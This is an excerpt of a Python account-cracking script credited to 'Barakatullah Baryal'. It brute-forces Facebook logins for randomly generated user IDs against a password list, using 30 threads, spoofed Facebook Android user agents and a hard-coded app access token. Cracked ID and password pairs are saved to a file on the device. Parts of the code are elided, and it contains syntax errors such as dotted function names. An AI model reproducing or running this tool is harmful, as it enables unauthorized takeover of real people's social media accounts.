...
----------------------------------------------
☆AUTHER   : Barakatullah Baryal
☆TEAM     : Baryal-TEAM
☆BROTHER ❤️:  Nimatullah
☆Facebook : Barakatullah Baryal
☆B.Baryal    : RANDOM LUSH 
...
def B.Baryalafghan():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as B.Baryal:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					B.Baryal.submit(rndm,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def B.Baryalafghan1():
		...
		with tred(max_workers=30) as B.Baryal:	
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					B.Baryal.submit(rndm2,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
enB.Baryal1 = ['en_GB','en_US']
B.Baryalfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
B.Baryalsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [B.Baryal-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                B.Baryalsim = random.choice(B.Baryalsim1)
                                gtt=random.choice(modelxxx)
                                enB.Baryal=random.choice(enB.Baryal1)
                                B.Baryalfban=random.choice(B.Baryalfban1)
                                gttt=random.choice(modelxxx)
                                android_version=str(random.randrange(6,13))
                                B.Baryal_ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(B.Baryalsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/B.Baryal-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [B.Baryal-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/B.Baryal-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [B.Baryal-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/B.Baryal-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;32m [B.Baryal-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
